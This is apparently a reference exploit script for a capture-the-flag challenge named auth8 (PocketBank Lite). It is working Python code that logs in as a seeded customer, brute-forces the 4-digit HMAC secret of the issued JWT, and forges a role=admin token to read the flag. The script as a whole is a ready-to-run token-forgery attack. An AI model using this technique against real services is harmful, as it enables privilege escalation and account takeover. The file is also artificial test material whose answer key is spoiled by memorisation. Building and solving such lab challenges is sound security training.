#!/usr/bin/env python3
"""Reference exploit for auth8 (PocketBank Lite).

Logs in as the seeded customer to get a sample token, brute-forces the
4-digit HMAC secret against its own signature, then forges a role=admin
token signed with the recovered secret.
"""
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import time

import requests  # pip install requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("BASE", "http://127.0.0.1:8067")


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def wait_up(s: requests.Session) -> None:
    for _ in range(30):
        try:
            s.get(BASE, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)


def main() -> int:
    s = requests.Session()
    wait_up(s)

    s.post(f"{BASE}/login", data={"account": "customer", "password": "customer123"},
           timeout=5)
    # The login response shows only the dashboard; the token is delivered in a
    # `token` cookie (Set-Cookie header), which the session jar keeps.
    token = s.cookies.get("token")
    if not token or token.count(".") != 2:
        sys.stderr.write("login did not set a token cookie\n")
        return 1
    h_b64, p_b64, s_b64 = token.split(".")
    signature = b64url_decode(s_b64)
    signing_input = f"{h_b64}.{p_b64}".encode()

    # Pre-exploit: the legitimately-issued, non-admin token must NOT reach the flag.
    r = s.get(f"{BASE}/accounts/admin", timeout=5, headers={"Authorization": f"Bearer {token}"})
    if r.status_code == 200 and "flag{" in r.text:
        sys.stderr.write("precondition failed: customer token already admin\n")
        return 1

    secret = None
    for candidate in range(10000):
        cand = f"{candidate:04d}"
        if hmac.compare_digest(
            hmac.new(cand.encode(), signing_input, hashlib.sha256).digest(), signature
        ):
            secret = cand
            break
    if secret is None:
        sys.stderr.write("could not recover the 4-digit secret\n")
        return 1

    header = b64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64url_encode(json.dumps({"account": "attacker", "role": "admin"},
                                        separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{header}.{payload}".encode(), hashlib.sha256).digest()
    forged = f"{header}.{payload}.{b64url_encode(sig)}"

    r = s.get(f"{BASE}/accounts/admin", timeout=5, headers={"Authorization": f"Bearer {forged}"})
    m2 = re.search(r"flag\{[^}]+\}", r.text)
    if m2:
        print(m2.group(0))
        return 0

    sys.stderr.write("no flag found\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
